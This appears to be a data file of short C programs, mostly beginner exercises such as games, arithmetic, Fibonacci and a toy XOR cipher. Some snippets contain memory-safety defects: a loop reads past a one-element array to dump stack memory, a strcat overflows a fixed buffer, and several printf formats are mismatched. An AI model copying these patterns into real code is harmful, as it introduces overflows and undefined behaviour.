    "#include <stdio.h>\nint main()\n{\n    int thing_var;\n    int *thing_ptr;\n    thing_var = 2;\n    printf(\"Thing %d\\n\", thing_var);\n    thing_ptr = &thing_var;\n    *thing_ptr = 3;\n    printf(\"Thing %d\\n\", thing_var);\n    printf(\"Thing %d\\n\", *thing_ptr);\n    return (0);\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nvoid f(int b) {\n    int x = 5;\n    uint32_t a[1] = { 3 };\n    for (int i = 0; i < 16; i++)\n        printf(\"%2d: Address %p contains %x\\n\", i, &a[i], a[0 + i]);\n}\nint main(void) {\n    int a = 9;\n    printf(\"function main is at address %p\\n\", &main);\n    printf(\"function f is at address %p\\n\", &f);\n    f(42);\n    return 0;\n}",
    "#include <stdio.h>\nint getHeight(int n) {\n    int a = 1, flag = 1;\n    while(n--) {\n        if (flag) {\n            a *= 2;\n            flag = 0;\n        } else {\n            a += 1;\n            flag = 1;\n        }\n    }\n    return a;\n}\nint main() {\n    int t;\n    scanf(\"%d\", &t);\n    for (int a0 = 0; a0 < t; a0++){\n        int n;\n        scanf(\"%d\", &n);\n        int res = getHeight(n);\n        printf(\"%d\\n\", res);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n unsigned int opA;\n unsigned int opB;\n while(scanf(\"%d %d\", &opA, &opB) != (-1))\n {\n  printf(\"%d\\n\", (unsigned)(opA | opB) - (opA & opB));\n }\n return 0;\n}",
    "#include <stdio.h>\n\nint main() {\n int i_a = 12, i_b = 3;\n printf(\"i_a = %i, i_b = %i\\n\", i_a, i_b);\n {int bfr = i_b; i_b = i_a; i_a = bfr;};\n printf(\"i_a = %i, i_b = %i\\n\", i_a, i_b);\n float f_a = 1.234, f_b = 3.212;\n printf(\"f_a = %f, f_b = %f\\n\", f_a, f_b);\n {float bfr = f_b; f_b = f_a; f_a = bfr;};\n printf(\"f_a = %f, f_b = %f\\n\", f_a, f_b);\n char c_a = 'a', c_b = 'Z';\n printf(\"c_a = %c, c_b = %c\\n\", c_a, c_b);\n {char bfr = c_b; c_b = c_a; c_a = bfr;};\n printf(\"c_a = %c, c_b = %c\\n\", c_a, c_b);\n return 0;\n}",
    "#include <stdio.h>\nint pencils;\nvoid swap(int* a,int* b){\n int i=*a;\n *a=*b;\n *b=i;\n}\nint tot(int num,int pri){\n int i;\n for(i=0;i*num<pencils;i++);\n return i*pri;\n}\nint main(void){\n int num1,pri1,num2,pri2,num3,pri3;\n int tot1,tot2,tot3;\n scanf(\"%d%d%d%d%d%d%d\",&pencils,&num1,&pri1,&num2,&pri2,&num3,&pri3);\n tot1=tot(num1,pri1);\n tot2=tot(num2,pri2);\n tot3=tot(num3,pri3);\n printf(\"%d\",(((tot1<tot2)?tot1:tot2)<tot3)?((tot1<tot2)?tot1:tot2):tot3);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nvoid print(int input, int dp){\n    if(dp==13) return;\n    print(input >> 1, dp +1);\n    printf(\"%d\",input&1);\n}\nint main()\n{\n   int cases, a,b;char mode, zeros, i;\n   scanf(\"%d\",&cases);\n   while(cases--){\n        scanf(\"%X %c %X\", &a,&mode,&b);\n        if(mode == '-'){\n            if(b > a){\n                a ^= b;\n                b ^= a;\n                a ^= b;\n            }\n        }\n        print(a,0);\n        printf(\" %c \", mode);\n        print(b,0);\n        printf(\" = %d\\n\", (mode == '-' ? a - b : a + b));\n   }\n    return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\nint main()\n{\n printf(\"%d\\n\",pow(2,4));\n}",
    "int main() {\n    int x = 1;\n    int y = 1;\n    int x1 = 0;\n    int y1 = 0;\n    while (x <= 100 && y <= 100) {\n        if (x <= 50) {\n            x1=x+y;\n            y1=x+2*y;\n        } else {\n            x1=x+y;\n            y1=x+3*y;\n        }\n        x=x1;\n        y=y1;\n    }\n}",
    "#include <stdio.h>\nvoid clean_stdin(void);\nint main()\n{\n    FILE *f_in;\n    FILE *f_out;\n    char file_name[31];\n    char c;\n    printf(\"Podaj nazwe pliku wejsciowego:\\n\");\n    scanf(\"%30s\", file_name);\n    if((f_in = fopen(file_name, \"r\")) == ((void*)0))\n    {\n        printf(\"Couldn't open file\\n\");\n        return 4;\n    }\n    clean_stdin();\n    printf(\"Podaj nazwe pliku wyjsciowego:\\n\");\n    scanf(\"%30s\", file_name);\n    if((f_out = fopen(file_name, \"w\")) == ((void*)0))\n    {\n        printf(\"Couldn't create file\\n\");\n        fclose(f_in);\n        return 5;\n    }\n    c = fgetc(f_in);\n    while(c != (-1))\n    {\n        putc(c,f_out);\n        c = fgetc(f_in);\n    }\n    printf(\"File copied\\n\");\n    fclose(f_in);\n    fclose(f_out);\n    return 0;\n}\nvoid clean_stdin(void)\n{\n    int c;\n    do\n    {\n        c = getchar();\n    }while(c != '\\n' && c != (-1));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nfloat reduce(float *input) {\n  int i;\n  float v = 0;\n  for (i = 0; i < 16*16*16; ++i) {\n    v += input[i];\n  }\n  return v;\n}\nint main(int argc, char *argv[]) {\n  float *g1;\n  size_t nelms = 16*16*16;\n  g1 = (float *)malloc(sizeof(float) * nelms);\n  int i;\n  for (i = 0; i < (int)nelms; i++) {\n    g1[i] = i;\n  }\n  float v = reduce(g1);\n  printf(\"%f\\n\", v);\n  free(g1);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(){\n    char string1[] = \"Hello\";\n    char string2[] = \" World\";\n    strcat(string1, string2);\n    printf(\"%s\\n\",string1);\n  return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void)\n{\n    int number;\n    printf(\"%s\", \"\\nEnter an integer : \");\n    scanf(\"%d\", &number);\n    int sum = 0;\n    while (number != 0) {\n        sum += (number % 10);\n        number /= 10;\n    }\n    printf(\"\\nThe sum of the digits of the integer is %d.\\n\\n\", sum);\n}",
    "#include <stdio.h>\nint main(void) {\n  int valor = 11;\n  printf(\" O printf de fora: Informe um n\u00famero entre 2 e 10: \");\n  scanf(\"%d\", &valor);\n  while (valor < 2 || valor > 10) {\n    printf(\" O printf de dentro: Informe um n\u00famero entre 2 e 10: \");\n    scanf(\"%d\", &valor);\n  }\n  if(valor > 5){\n  printf(\"\\n\\n %d \u00e9 maior que cinco \\n\\n\", valor);\n  };\n  if(valor < 5){\n  printf(\"\\n\\n %d \u00e9 menor que cinco \\n\\n\", valor);\n  };\n  return 0;\n}",
    "#include <stdlib.h>\nint main(int argc, char *argv[]) {\n  if(argc == 2) {\n    return 1;\n  }\n  return argc;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\ntypedef unsigned long long uint64;\ntypedef unsigned short uint16;\nuint16 game()\n{\n uint16 your;\n uint16 enemy;\n uint16 your_cnt = 0;\n uint16 enemy_cnt = 0;\n char drop = '\\0';\n char _unused = '\\0';\n while (your_cnt != 2 && enemy_cnt != 2) {\n  printf(\"drop again?(d): \");\n  if (1 != scanf(\"%c%c\", &drop, &_unused)) {\n   fprintf((stderr), \"err\\n\");\n  }\n  if ('d' == drop) {\n   your = rand() % 6 + 1;\n   enemy = rand() % 6 + 1;\n   printf(\"your number is %d\\n\", your);\n   printf(\"enemy's number is %d\\n\", enemy);\n   if (your > enemy)\n    your_cnt++;\n   else if (enemy > your)\n    enemy_cnt++;\n  } else\n   printf(\"something went wrong\\n\");\n }\n if (your_cnt > enemy_cnt)\n  return 1;\n else if (enemy_cnt > your_cnt)\n  return 0;\n}\nint main(void)\n{\n srand(time(0));\n char start = '\\0';\n uint16 winner = 0;\n char _unused = '\\0';\n printf(\"To start the game press space: \");\n if (1 != scanf(\"%c%c\", &start, &_unused)) {\n  fprintf((stderr), \"err\\n\");\n }\n if (' ' == start) {\n  printf(\"you entered '%c'\\n\", start);\n  printf(\"You have to win 2 rounds to win the game\\n\");\n  winner = game();\n  if (winner == 1)\n   printf(\"You won the game\\n\");\n  else if (winner == 0)\n   printf(\"You loose the game\\n\");\n } else\n  printf(\"(%c)wrong, try again\\n\", start);\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n  double dec = 1.5;\n  int num = 1;\n  char ch = 'A';\n  int *dp = &dec;\n  int *ip = &num;\n  int *cp = &ch;\n  printf(\"Double Address: 0x%x Double Value %f: Double Size %lu: \", &dec, dec, sizeof(dec));\n  printf(\"Int Address: 0x%x Int Value %d: Int Size %lu: \", &num, num, sizeof(dec));\n  printf(\"Char Address: 0x%x Char Value %c: Char Size %lu: \", &ch, ch, sizeof(dec));\n}",
    "int printf();\nint main() {\n    if (0) printf(\"a\");\n    if (1) printf(\"b\");\n    if (0) printf(\"c\");\n    else printf(\"d\");\n    if (1) printf(\"e\");\n    else printf(\"f\");\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n int x, y, z;\n printf(\"Enter x and y: \");\n scanf(\"%d%d\", &x, &y);\n z = x++ + --y + (x < y);\n printf(\"z = %d\\n\", z);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int i = 0x12345678;\n    fwrite(&i, sizeof(i), 1, (stdout));\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n int A,B,C;\n int sol;\n scanf(\"%d\",&A);\n scanf(\"%d\",&B);\n scanf(\"%d\",&C);\n if(B>=C)\n {\n  sol = -1;\n }\n else\n {\n  sol = A/(C-B)+1;\n }\n printf(\"%d\",sol);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(void)\n{\n    int randomNumber = 0;\n    int guess = 0;\n    int numberOfGuesses;\n    time_t t;\n    srand((unsigned)time(&t));\n    randomNumber = rand() % 21;\n    printf(\"\\nThis is a guessing game.\");\n    printf(\"\\nI have chosen a number between 0 and 20, which you must guess. \\n\");\n    for (numberOfGuesses = 5; numberOfGuesses > 0; --numberOfGuesses)\n    {\n        printf(\"\\nYou have %d tr%s left.\", numberOfGuesses, numberOfGuesses == 1 ? \"y\" : \"ies\");\n        printf(\"\\nEnter a guess: \");\n        scanf(\"%d\", &guess);\n        if (guess == randomNumber)\n        {\n            printf(\"\\nCongratulations.  You guessed it!\\n\");\n            return (0);\n        }\n        else if (guess < 0 || guess > 20)\n            printf(\"I said the number is between 0 and 20.\\n\");\n        else if (randomNumber > guess)\n            printf(\"Sorry, %d is wrong.  My number is greater than that.\\n\", guess);\n        else if (randomNumber < guess)\n            printf(\"Sorry, %d is wrong.  My number is less than that.\\n\", guess);\n    }\n    printf(\"\\nYou have had five tries and failed. The number was %d\\n\", randomNumber);\n    return (0);\n}",
    "#include <stdio.h>\nint main() {\n  float mark1, mark2, average;\n  printf(\"Input Mark 01 : \");\n  scanf(\"%f\", &mark1);\n  printf(\"Input Mark 02 : \");\n  scanf(\"%f\", &mark2);\n  average = (mark1 + mark2) / 2.0;\n  printf(\"The Average is %.2f \\n\", average);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, i, x = 0;\n    char s[5];\n    scanf(\"%d\", &n);\n    for(i = 1; i <= n; i++) {\n        scanf(\"%s\", s);\n        if(s[0] == '+' || s[2] == '+')\n            x++;\n        else if(s[0] == '-' || s[2] == '-')\n            x--;\n    }\n    printf(\"%d\\n\", x);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n   printf(\"\\nHello, World!\\n\\n\");\n   return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid categorize(char a[], char b[]){\n  int num = 0;\n  while(num < strlen(a)){\n    if(a[num] == 'A'){\n      int c = 1;\n      while(a[num] == a[num+1]) {num++; c++;}\n      if(c >= 0 && c <= 9){\n      char d = '0' + c;\n      int len = strlen(b); b[len] = 'A'; b[len+1] = d; b[len+2] = '\\0';\n      }\n      if(c >= 10 && c <= 99){\n      char d = '0' + c / 10;\n      char e = '0' + c % 10 ;\n      int len = strlen(b); b[len] = 'A'; b[len+1] = d; b[len+2] = e; b[len+3] = '\\0';\n      }\n      if(c == 100){\n      int len = strlen(b); b[len] = 'A'; b[len+1] = '1'; b[len+2] = '0';b[len+3] = '0'; b[len+4] = '\\0';\n      }\n      num++;\n    }\n    if(a[num] == 'T'){\n      int c = 1;\n      while(a[num] == a[num+1]) {num++; c++;}\n      if(c >= 0 && c <= 9){\n      char d = '0' + c;\n      int len = strlen(b); b[len] = 'T'; b[len+1] = d; b[len+2] = '\\0';\n      }\n      if(c >= 10 && c <= 99){\n      char d = '0' + c / 10;\n      char e = '0' + c % 10 ;\n      int len = strlen(b); b[len] = 'T'; b[len+1] = d; b[len+2] = e; b[len+3] = '\\0';\n      }\n      if(c == 100){\n      int len = strlen(b); b[len] = 'T'; b[len+1] = '1'; b[len+2] = '0';b[len+3] = '0'; b[len+4] = '\\0';\n      }\n      num++;\n    }\n    if(a[num] == 'G'){\n      int c = 1;\n      while(a[num] == a[num+1]) {num++; c++;}\n      if(c >= 0 && c <= 9){\n      char d = '0' + c;\n      int len = strlen(b); b[len] = 'G'; b[len+1] = d; b[len+2] = '\\0';\n      }\n      if(c >= 10 && c <= 99){\n      char d = '0' + c / 10;\n      char e = '0' + c % 10 ;\n      int len = strlen(b); b[len] = 'G'; b[len+1] = d; b[len+2] = e; b[len+3] = '\\0';\n      }\n      if(c == 100){\n      int len = strlen(b); b[len] = 'G'; b[len+1] = '1'; b[len+2] = '0';b[len+3] = '0'; b[len+4] = '\\0';\n      }\n      num++;\n    }\n    if(a[num] == 'C'){\n      int c = 1;\n      while(a[num] == a[num+1]) {num++; c++;}\n      if(c >= 0 && c <= 9){\n      char d = '0' + c;\n      int len = strlen(b); b[len] = 'C'; b[len+1] = d; b[len+2] = '\\0';\n      }\n      if(c >= 10 && c <= 99){\n      char d = '0' + c / 10;\n      char e = '0' + c % 10 ;\n      int len = strlen(b); b[len] = 'C'; b[len+1] = d; b[len+2] = e; b[len+3] = '\\0';\n      }\n      if(c == 100){\n      int len = strlen(b); b[len] = 'C'; b[len+1] = '1'; b[len+2] = '0';b[len+3] = '0'; b[len+4] = '\\0';\n      }\n      num++;\n    }\n  }\n}\nint main() {\n  char dna[100] = \"\";\n  scanf(\"%99s\", dna);\n  char compress [200] = \"\";\n  categorize(dna,compress);\n  if(strlen(compress) < strlen(dna)) {\n    for(int i = 0; i < strlen(compress); i++){\n      printf(\"%c\",compress[i]);\n    }\n  }\n  else {\n    for(int i = 0; i < strlen(dna); i++){\n      printf(\"%c\",dna[i]);\n    }\n  }\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int n, i, j, multiplo = 0;\n    printf(\"\\nInforme os n\u00fameros inteiros positivos 'n','i' e 'j'.\\nOnde 'n' ser\u00e1 a quantidade de n\u00fameros em ordem crescentes,\\nque sejam m\u00faltiplos de 'i' ou de 'j' ou de ambos.\\n\");\n    printf(\"\\nInforme 'n': \");\n    scanf(\"%i\", &n);\n    printf(\"\\nInforme 'i': \");\n    scanf(\"%i\", &i);\n    printf(\"\\nInforme 'j': \");\n    scanf(\"%i\", &j);\n    printf(\"\\n\");\n    for (int qtd = 0; qtd < n;)\n    {\n        if (((multiplo % i) == 0) || ((multiplo % j) == 0))\n        {\n            if (qtd == (n - 1))\n            {\n                printf(\"%i.\", multiplo);\n            }\n            else\n            {\n                printf(\"%i,\", multiplo);\n            }\n            qtd++;\n        }\n        multiplo++;\n    }\n    printf(\"\\n\\n\");\n    return 0;\n}",
    "#include <stdio.h>\ntypedef double (*coeff_func)(unsigned n);\ndouble calc(coeff_func f_a, coeff_func f_b, unsigned expansions)\n{\n double a, b, r;\n a = b = r = 0.0;\n unsigned i;\n for (i = expansions; i > 0; i--) {\n  a = f_a(i);\n  b = f_b(i);\n  r = b / (a + r);\n }\n a = f_a(0);\n return a + r;\n}\ndouble sqrt2_a(unsigned n)\n{\n return n ? 2.0 : 1.0;\n}\ndouble sqrt2_b(unsigned n)\n{\n return 1.0;\n}\ndouble napier_a(unsigned n)\n{\n return n ? n : 2.0;\n}\ndouble napier_b(unsigned n)\n{\n return n > 1.0 ? n - 1.0 : 1.0;\n}\ndouble pi_a(unsigned n)\n{\n return n ? 6.0 : 3.0;\n}\ndouble pi_b(unsigned n)\n{\n double c = 2.0 * n - 1.0;\n return c * c;\n}\nint main(void)\n{\n double sqrt2, napier, pi;\n sqrt2 = calc(sqrt2_a, sqrt2_b, 1000);\n napier = calc(napier_a, napier_b, 1000);\n pi = calc(pi_a, pi_b, 1000);\n printf(\"%12.10g\\n%12.10g\\n%12.10g\\n\", sqrt2, napier, pi);\n return 0;\n}",
    "#include<stdio.h>\nint n;\nint N(int *ar,int,int);\nint M(int *ar,int,int);\nint H(int *ar,int,int);\nint min(int,int);\nint max(int,int);\nint main()\n{\n    int K,i=0;\n    scanf(\"%d%d\",&n,&K);\n    int a[10005],l[K],r[K];\n    while(i<n){\n        scanf(\"%d\",&a[i]);\n        i++;\n    }\n    i=0;\n    while(i<K){\n        scanf(\"%d%d\",&l[i],&r[i]);\n        i++;\n    }\n    i=0;\n    while(i<K){\n        printf(\"%d\\n\",H(a,min(N(a,l[i],r[i]),M(a,l[i],r[i])),max(N(a,l[i],r[i]),M(a,l[i],r[i]))));\n        i++;\n    }\n    return 0;\n}\nint min(int x,int y)\n{\n    if(x<y){\n        return x;\n    }\n    else if(x>=y){\n        return y;\n    }\n}\nint max(int x,int y)\n{\n    if(x>y){\n        return x;\n    }\n    else if(x<=y){\n        return y;\n    }\n}\nint N(int *ar,int x,int y)\n{\n    int s=0;\n    for(int t=x;t<=y;t++){\n        s+=ar[t];\n    }\n    return s%n;\n}\nint M(int *ar,int x,int y)\n{\n    int s=1;\n    for(int t=x;t<=y;t++){\n        s=((s%n)*(ar[t]%n))%n;\n    }\n    return s;\n}\nint H(int *ar,int x,int y)\n{\n    int s=ar[x];\n    for(int t=x+1;t<=y;t++){\n        s=s^ar[t];\n    }\n    return s;\n}",
    "#include <stdio.h>\nint factorial(int n)\n{\n    if(n == 0)\n    {\n        return 1;\n    }\n    else\n    {\n        return n * factorial(n - 1);\n    }\n}\nint fib(int n)\n{\n    if(n == 0 || n == 1)\n    {\n        return n;\n    }\n    else\n    {\n        return fib(n - 1) + fib(n - 2);\n    }\n}\ndouble pow(int base, int exp)\n{\n    if(exp == 0)\n    {\n        return 1;\n    }\n    else if(exp < 0)\n    {\n        return 1 / pow(base, exp * -1);\n    }\n    else\n    {\n        return base * pow(base, exp - 1);\n    }\n}\nvoid TowersOfHanoi(int n, char beg, char aux, char end)\n{\n    if(n == 0)\n    {\n        return;\n    }\n    else if(n == 1)\n    {\n        printf(\"%c -> %c\\n\", beg, end);\n        return;\n    }\n    TowersOfHanoi(n - 1, beg, end, aux);\n    printf(\"%c -> %c\\n\", beg, end);\n    TowersOfHanoi(n - 1, aux, beg, end);\n}\nint main()\n{\n    int num, exp;\n    printf(\"Input any number: \");\n    scanf(\"%d\", &num);\n    printf(\"\\nInput power: \");\n    scanf(\"%d\", &exp);\n    printf(\"\\nOutput: %d\\n\", (int)pow(num, exp));\n    TowersOfHanoi(3, 'A', 'B', 'C');\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int c;\n int i;\n int PrimeNumber;\n int count = 0;\n scanf(\"%d\", &c);\n for ( i = c + 1; i <= 200000; i++)\n  {\n  for (int j = 2; j <= i / 2; j++)\n   {\n   if (i%j == 0)\n    {\n    count++;\n   }\n  }\n  if (count == 0)\n   {\n   PrimeNumber = i;\n   break;\n  }\n  count=0;\n }\n printf(\"%d\", PrimeNumber);\n return PrimeNumber;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\n\n\nvoid shuffle(int *array) {\n for (int i = 1000000 - 1 - 1; i > 0; i--) {\n        int j = rand() % (i + 1);\n        int tmp = array[j];\n        array[j] = array[i];\n        array[i] = tmp;\n    }\n}\nint main(void) {\n    srand(time(((void*)0)));\n    int * numeros = malloc((1000000 - 1) * sizeof(int));\n if (!numeros) exit(1);\n for (int i = 0; i < 1000000 - 1; i++) numeros[i] = i + 1;\n shuffle(numeros);\n for (int i = 0; i < 10000; i++) printf(\"%d\\n\", numeros[i]);\n}",
    "#include<stdio.h>\nint sumupto(int n)\n{\n    return (n==0)?0:(n+sumupto(n-1));\n}\nint main()\n{\n    int n;\n    printf(\"Enter a number = \");\n    scanf(\"%d\",&n);\n    printf(\"\\nThe sum of natural numbers upto %d is %d\",n,sumupto(n));\n    return 0;\n}",
    "#include <stdio.h>\nint main (void)\n{\n    return 0;\n}",
    "#include <stdio.h>\nint main ()\n{\n    char continuar;\n    float nota=0, media=0, totalnotas=0, notacima=0, notabaixo=0;\n    int alunos=0;\n    do\n    {\n        printf(\"\\nInsira a nota do aluno:\\n\");\n        scanf(\"%f\", &nota);\n        if (nota>5)\n        {\n            notacima = notacima + 1;\n        }\n        else\n        {\n            notabaixo = notabaixo + 1;\n        }\n        alunos = alunos + 1;\n        totalnotas = totalnotas + nota;\n        printf(\"\\n Deseja continuar: s/n\\n\");\n        scanf(\" %c\", &continuar);\n    }\n    while (continuar == 's');\n    media = (float) totalnotas/alunos;\n    printf(\"\\nMedia Aritmetica \u00e9 %.2f.\\n\", media);\n    if(notacima>=1)\n    {\n         if (notacima==1)\n         {\n             printf(\"\\nTemos %.0f aluno com nota acima de 5.\\n\", notacima);\n         }\n         else\n         {\n             printf(\"\\nTemos %.0f alunos com notas acima de 5.\\n\", notacima);\n         }\n    }\n    if (notacima<1)\n    {\n        printf(\"\\nN\u00e3o h\u00e1 nenhum aluno com nota acima de 5.\\n\");\n    }\n    if (notabaixo>=1)\n    {\n        if (notabaixo==1)\n        {\n            printf(\"\\nTemos %.0f aluno com nota abaixo de 5.\\n\", notabaixo);\n        }\n        else\n        {\n            printf(\"\\nTemos %.0f alunos com notas abaixo de 5.\\n\", notabaixo);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int t,c1=0,c2=0,c3=0;\n    while(1)\n    {\n        scanf(\"%d\", &t);\n        if ( t == 4)\n        {\n            break;\n        }\n        else if (t == 1)\n        {\n           c1++;\n        }\n        else if (t == 2)\n        {\n            c2++;\n        }\n        else if (t == 3)\n        {\n            c3++;\n        }\n    }\n    printf(\"MUITO OBRIGADO\\n\");\n    printf(\"Alcool: %d\\n\", c1);\n    printf(\"Gasolina: %d\\n\", c2);\n    printf(\"Diesel: %d\\n\", c3);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid prt_not_mcn(int n){\n    for(int i = 1; i <= n; i++){\n        int d = i;\n        while(d >= 0){\n            if(d!=3 && (d>43 || d%3==0)) break;\n            d -=20;\n        }\n        if(d < 0) printf(\"%d\\n\", i);\n    }\n}\nint main(int argc, char* argv[]){\n    int n = strtol(argv[1], ((void*)0), 10);\n    prt_not_mcn(n);\n    return 0;\n}",
    "#include<stdio.h>\nint main () {\n    int i;\n    for(i=10;i>=1;i--){\n        printf(\"%i.\\n\",i);\n    }\n    return 0;\n}",
    "#include <unistd.h>\nint main (void)\n{\n  sync() ;\n  _exit(0) ;\n}",
    "#include <stdio.h>\nint main(){\n    int valor1, valor2;\n    int soma;\n        printf(\"Valor 1 ? \" );\n        scanf(\"%d\",&valor1);\n        printf(\"Valor 2 ? \" );\n        scanf(\"%d\",&valor2);\n        soma = valor1 + valor2;\n        printf(\"%d + %d = %d \\n\",valor1,valor2, soma);\n        return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <string.h>\nunsigned long fibonacci(unsigned int n);\nunsigned long * fibonacci_array(unsigned int n);\nunsigned long fibonacci2(unsigned long * fib, unsigned int n);\nunsigned long * reverse(unsigned long * array, unsigned int i, unsigned int j);\nunsigned long * complete_reverse(unsigned long * array, unsigned int array_len);\nvoid swap_long(unsigned long *x, unsigned long *y);\nvoid bubble_sort(unsigned long * array, int array_dimension);\nint main(int argc, char * argv[]) {\n unsigned int n = 39;\n int result;\n unsigned long *fibonacci_result = fibonacci_array(n);\n unsigned long *fibonacci_result_copy = malloc((n+1) * sizeof(unsigned long));\n memcpy(fibonacci_result_copy, fibonacci_result, (n+1) * sizeof(unsigned long));\n fibonacci_result_copy = complete_reverse(fibonacci_result_copy, n+1);\n bubble_sort(fibonacci_result_copy, n+1);\n result = memcmp(fibonacci_result, fibonacci_result_copy, (n+1) * sizeof(unsigned long));\n printf(\"\\nRisultato confronto tra fibonacci_result e fibonacci_result_copy : %d\", result);\n return 0;\n}\nunsigned long fibonacci(unsigned int n){\n if(n == 0)\n  return 0;\n else if(n == 1)\n  return 1;\n return fibonacci(n-1) + fibonacci(n-2);\n}\nunsigned long * fibonacci_array(unsigned int n){\n unsigned long *fib_array;\n fib_array = calloc(n+1, sizeof(unsigned long));\n if(n == 0){\n  return fib_array;\n }\n fib_array[1] = 1;\n if(n == 1){\n  return fib_array;\n }\n fib_array[n] = fibonacci2(fib_array, n);\n return fib_array;\n}\nunsigned long fibonacci2(unsigned long * fib, unsigned int n){\n if(n == 0)\n  return 0;\n else if(n == 1)\n  return 1;\n unsigned long res = fibonacci2(fib, n-1) + fibonacci2(fib, n-2);\n fib[n] = res;\n return res;\n}\nunsigned long * reverse(unsigned long * array, unsigned int i, unsigned int j)\n{\n while (i < j)\n  swap_long(&array[i++], &array[--j]);\n return array;\n}\nunsigned long * complete_reverse(unsigned long * array, unsigned int array_len) {\n return reverse(array, 0, array_len);\n}\nvoid swap_long(unsigned long *x, unsigned long *y) {\n unsigned long t = *x;\n *x = *y;\n *y = t;\n}\nvoid bubble_sort(unsigned long * array, int array_dimension) {\n int n = array_dimension;\n do{\n  int newn = 0;\n  for(int i = 1; i < n; i++){\n   if(array[i - 1] > array[i]){\n    swap_long(&array[i-1], &array[i]);\n    newn = i;\n   }\n  }\n  n = newn;\n }while(n > 1);\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid xor_encrypt(char *key, char *string, int n)\n{\n    int i;\n    int keyLength = strlen(key);\n    for( i = 0 ; i < n ; i++ )\n    {\n        string[i]=string[i]^key[i%keyLength];\n    }\n}\nint main(void) {\n  char plain[] = \"This is plain text\";\n  char key[] = \"Abcdabcdabciabcdabcd\";\n  int n = strlen(plain);\n  xor_encrypt(key, plain, n);\n  printf(\"encrypted string: \\n\");\n  for(int ii = 0; ii < n; ii++) {\n    if(plain[ii] > 0x32 && plain[ii] < 0x7F ) printf(\"%c\", plain[ii]);\n   else printf(\" 0x%02x \", plain[ii]);\n  }\n  printf(\"\\n\");\n  xor_encrypt(key, plain, n);\n  printf(\"after round trip, plain string is '%s'\\n\", plain);\n}",
    "#include<stdio.h>\nint main()\n{\n    int A,B,C,D;\n    scanf(\"%d %d %d %d\",&A,&B,&C,&D);\n    if(B>C && D>A && (C+D)>(A+B) && C>0 && D>0 && (A%2)==0)\n        printf(\"Valores aceitos\\n\");\n    else\n        printf(\"Valores nao aceitos\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\nfloat far, celsius;\nprintf (\"Informe a temperatura em Celsius\");\nscanf (\"%f\", &celsius);\nfar = 1.8 * celsius + 32;\nprintf (\" A temperatura em Fahrenheit \u00e9 %f\", far);\nreturn 0;\n}",
    "#include <stdio.h>\nvoid sum() {\n int a, b, sum = 0;\n printf(\"Enter two numbers: \");\n scanf(\"%d %d\", &a, &b);\n sum = a + b;\n printf(\"The sum is: %d \\n\", sum);\n}\nint main() {\n sum();\n printf(\"Hello More calculation. \\n\");\n sum();\n printf(\"Hello \\n\");\n sum();\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, const char * argv[])\n{\n    char myName[4];\n    myName[0] = 'A';\n    myName[1] = 'x';\n    myName[2] = 'l';\n    myName[3] = '\\0';\n    int myNameAsAnInt;\n    printf(\"The size of an int variable is: %lu bytes\\n\", sizeof(int));\n    printf(\"The size of a char variable is: %lu byte\\n\", sizeof(char));\n    printf(\"The size of myName is: %lu bytes\\n\", sizeof(myName));\n    printf(\"Here is the value of myName: %s\\n\", myName);\n    printf(\"Here is myName as an ASCII code: %d %d %d %d\\n\",\n           myName[0], myName[1], myName[2], myName[3]);\n    myNameAsAnInt = ((myName[0]<<24) + (myName[1]<<16) + (myName[2]<<8) + myName[3]);\n    printf(\"This is the first character in myName shifted by 24 (8*3) bits: %d\\n\",\n           (myName[0]<<24));\n    printf(\"This is the second character in myName shifted by 16 (8*2) bits: %d\\n\",\n           (myName[1]<<16));\n    printf(\"This is the third character in myName shifted by 8 bits: %d\\n\",\n           (myName[2]<<8));\n    printf(\"This is the fourth character in myName not shifted a bit: %d\\n\",\n           myName[3]);\n    printf(\"Here is myNme as an int: %d\\n\", myNameAsAnInt);\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    unsigned char n;\n    scanf(\"%hhu\", &n);\n    printf(\"%hu\", n * (n - 1));\n    return 0;\n}",
    "#include <stdio.h>\nint pro(int p)\n{\n int s=1;\n while (p!=1)\n {\n  if (p%2==0)\n   p=p>>1;\n  else p=3*p+1;\n  s++;\n }\n return s;\n}\nint main()\n{\n int a,b,i,j,k;\n while (scanf(\"%d%d\",&a,&b)!=(-1))\n {\n  printf(\"%d %d \",a,b);\n  if (a>b)\n  {\n   i=b;\n   b=a;\n   a=i;\n  }\n  for (i=a,j=1;i<=b;i++)\n  {\n   k=pro(i);\n   if (k>j)\n    j=k;\n  }\n  printf(\"%d\\n\",j);\n }\n return 0;\n}",
